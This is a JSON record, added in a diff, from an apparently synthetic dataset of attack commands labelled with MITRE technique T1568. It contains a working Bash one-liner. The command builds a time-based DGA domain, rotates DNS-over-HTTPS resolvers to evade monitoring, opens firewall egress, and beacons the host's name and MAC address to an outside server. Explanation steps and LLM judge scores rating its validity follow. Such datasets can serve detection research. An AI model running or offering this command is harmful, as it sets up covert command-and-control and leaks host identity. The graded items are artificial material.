@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"kappa\"; LABEL=$(printf \"%s\" \"${SEED}$(date -u +%Y%m%d%H%M)\" | sha1sum | cut -c1-10); FQDN=\"${LABEL}.cdn-route.xyz\"; PORT=4433; DOH=$(shuf -e https://cloudflare-dns.com/dns-query https://dns.google/dns-query https://dns.quad9.net/dns-query -n1); iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; curl -sSf --doh-url \"$DOH\" --max-time 5 --retry 1 --header \"X-Client: $(hostname -s)\" \"https://${FQDN}:${PORT}/beacon?mac=$(cat /sys/class/net/*/address 2>/dev/null | head -n1)\"",
+  "explanation": "Rotates DoH resolvers to dynamically resolve a minute-based DGA domain and beacons over port 4433, reducing detection via varied resolution paths and ports.",
+  "rationale_steps": [
+    "Generate fast-rotating DGA domain",
+    "Randomly choose a DoH provider",
+    "Open egress to nonstandard TLS port",
+    "Send beacon with minimal timing window"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-e18bbd99",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and substitutions with valid flags and separators (printf/sha1sum/cut, shuf -e -n1, iptables args, curl --doh-url) make it well-formed and parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It generates a minute-based DGA label, resolves via a randomly chosen DoH endpoint, and beacons to the derived FQDN on port 4433 (consistent with T1568), though iptables likely fails without root and the port is fixed rather than rotated.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T07:39:47.586059Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper semicolon separators, valid variable expansions, correct flag formats for curl and iptables, and no syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1568 by generating a minute-granular DGA domain via SHA1 of a seeded timestamp, rotating among three DoH resolvers (Cloudflare, Google, Quad9) to evade DNS monitoring, adding an iptables rule to permit egress on port 4433, and beaconing with host fingerprint data (hostname and MAC address) — all operationally plausible and tightly aligned with dynamic resolution C2 techniques.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:29:39.982690Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct Bash variable assignments, subshells, piping, and valid flags for curl, shuf, and iptables.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively demonstrates a time-based DGA and dynamic resolution via DoH; however, the inclusion of 'iptables' contradicts the 'Privilege: None' specification as it requires root access.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:29:43.018138Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
